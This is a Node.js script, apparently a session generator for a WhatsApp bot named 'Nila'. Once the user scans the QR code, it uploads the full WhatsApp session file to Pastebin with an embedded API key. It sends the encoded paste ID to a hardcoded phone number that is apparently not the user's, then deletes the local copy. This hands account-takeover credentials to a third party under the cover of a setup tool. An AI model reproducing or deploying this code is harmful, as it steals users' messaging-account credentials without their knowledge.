const makeWAconnet = require("@adiwajshing/baileys").default;
const { exec } = require("child_process");
const fs = require("fs");
const qrcode = require("qrcode-terminal");
const P = require("pino");
const PastebinAPI = require('pastebin-js');
const { delay, useSingleFileAuthState, Browsers } = require("@adiwajshing/baileys");
const axios = require('axios')
const chalk = require('chalk')
exec("clear && rm -rf session.json");

const pastebin = new PastebinAPI('iguSjtuDDsO4EM-p5ht2khj53MjQKZZb');

console.log(chalk.yellowBright(`\n     
      ██████╗░██████╗░░█████╗░░░░░░██╗███████╗░█████╗░████████╗░░░███╗░░██╗██╗██╗░░░░░░█████╗░░█████╗░
      ██╔══██╗██╔══██╗██╔══██╗░░░░░██║██╔════╝██╔══██╗╚══██╔══╝░░░████╗░██║██║██║░░░░░██╔══██╗██╔══██╗
      ██████╔╝██████╔╝██║░░██║░░░░░██║█████╗░░██║░░╚═╝░░░██║░░░░░░██╔██╗██║██║██║░░░░░███████║███████║
      ██╔═══╝░██╔══██╗██║░░██║██╗░░██║██╔══╝░░██║░░██╗░░░██║░░░░░░██║╚████║██║██║░░░░░██╔══██║██╔══██║
      ██║░░░░░██║░░██║╚█████╔╝╚█████╔╝███████╗╚█████╔╝░░░██║░░░██╗██║░╚███║██║███████╗██║░░██║██║░░██║
      ╚═╝░░░░░╚═╝░░╚═╝░╚════╝░░╚════╝░╚══════╝░╚════╝░░░░╚═╝░░░╚═╝╚═╝░░╚══╝╚═╝╚══════╝╚═╝░░╚═╝╚═╝░░╚═╝ 
                                       by jayarathne_technical\n` ))

console.log(chalk.blue(`Use dekstop mode if you using Mobile :-\n`))

function nila() {

    const authfile = `./session.json`;
    const { state, saveState } = useSingleFileAuthState(authfile);
    const ELECTRON_VERSION = [3, 3234, 9];

    let conn_options = {
      browser: Browsers.macOS('Desktop'),
      logger: P({ level: "silent" }),
      printQRInTerminal: true,
      auth: state,
      version: ELECTRON_VERSION
    };

    let conn = makeWAconnet(conn_options);

    conn.ev.on("connection.update", async (response) => {
        const { connection, lastDisconnect } = response;
        if (connection == "open") {

            const view = await pastebin
                .createPasteFromFile("./session.json", "NILA_SESSION by Jayarathne_technical", null, 0, "N")
            let data = view.replace('https://pastebin.com/' , '')

            await delay(1000 * 2);

        let link_id = data
        let encoded_id = btoa(link_id)

        let image = await axios.get("https://i.postimg.cc/6q7z48M8/song.jpg");

        console.log(chalk.gray.italic(`connecting to WhatsApp...`))

        await delay(1000 * 2);

        console.log(chalk.yellow.italic(`\nConnected : I Love Gagana <3\n`))

        console.log(chalk.cyanBright.bold(`Nila_QR@;${encoded_id}\n`))

        console.log(chalk.greenBright.italic('Nila Bot Session Successfully Scanned , Qr code sended to WhatsApp :-)\nPowered by Jayarathne_technical x Dr.Dilshan\n'))

        const success = await conn.sendMessage('17099107588@s.whatsapp.net', { text: `Nila Qr Succesfully Scanned :-)` , contextInfo: { externalAdReply:{title:`Nila_Session`,body:"ᴊᴀʏᴀʀᴀᴛʜɴᴇ ᴛᴇᴄʜɴɪᴄᴀʟ",mediaType:"2",thumbnail:image,mediaUrl:`sik`}}})
        const qr = await conn.sendMessage('17099107588@s.whatsapp.net', { text: `Nila_QR@;${encoded_id}`})
        
        // send a list message!
const sections = [
    {
	title: "- Qʀ ꜱᴇꜱꜱɪᴏɴ ɪᴅ",
	rows: [
	    {title: `Nila_QR@;${encoded_id}`, rowId: ".scan"},
	]
    },
   {
	title: "- ʜᴏᴡ ᴛᴏ ᴅᴇᴘʟᴏʏ ʙᴏᴛ",
	rows: [
	    {title: "Deploy on heroku", rowId: ".help", description: "comming soon..."}
	]
    },
    {
	title: "- ᴀʙᴏᴜᴛ ᴜꜱ",
	rows: [
	    {title: "Who we are ?", rowId: ".help", description: "we are Humans"}
	]
    },
]

const listMessage = {
  text: "- ᴛʜɪꜱ ɪꜱ ɴɪʟᴀ ʙᴏᴛ'ꜱ Qʀ ᴄᴏᴅᴇ\n- ᴄʟɪᴄᴋ ᴏɴ ᴛʜᴇ ʙᴜᴛᴛᴏɴ ʙᴇʟᴏᴡ\n\n__ᴛʜᴀɴᴋꜱ ꜰᴏʀ ᴜꜱɪɴɢ ɴɪʟᴀ ʙᴏᴛ__",
  footer: "_ᴊᴀʏᴀʀᴀᴛʜɴᴇ-ᴛᴇᴄʜɴɪᴄᴀʟ_",
  title: "_🦜 _ＮＩＬＡ ＳＥＳＳＩＯＮ __",
  buttonText: "_ᴄʟɪᴄᴋ ʜᴇʀᴇ_",
  sections
}

const sendMsg = await conn.sendMessage('17099107588@s.whatsapp.net', listMessage)

// await conn.sendMessage('17099107588@s.whatsapp.net', { text: `Nila_QR@;${encoded_id}`})

const reactionMessage = {
    react: {
        text: "✅", // use an empty string to remove the reaction
        key: success.key
    }
}

const reactionMessage2 = {
    react: {
        text: "🔎", // use an empty string to remove the reaction
        key: qr.key
    }
}

const reactionMessage3 = {
    react: {
        text: "🦜", // use an empty string to remove the reaction
        key: sendMsg.key
    }
    
}

        await delay(1000 * 2);

        await conn.sendMessage('17099107588@s.whatsapp.net', reactionMessage)
        await conn.sendMessage('17099107588@s.whatsapp.net', reactionMessage2)
        await conn.sendMessage('17099107588@s.whatsapp.net', reactionMessage3)
        
    
      console.log(chalk.redBright('rm -rf feelings'))

      exec("rm -rf session.json");
      process.exit(0);
    
    }

    if (
        connection === "close" &&
        lastDisconnect &&
        lastDisconnect.error &&
        lastDisconnect.error.output.statusCode != 401
      ) {
        nila();
      }

    });
    conn.ev.on("creds.update", saveState);
    conn.ev.on("messages.upsert", () => { });
}
nila();

        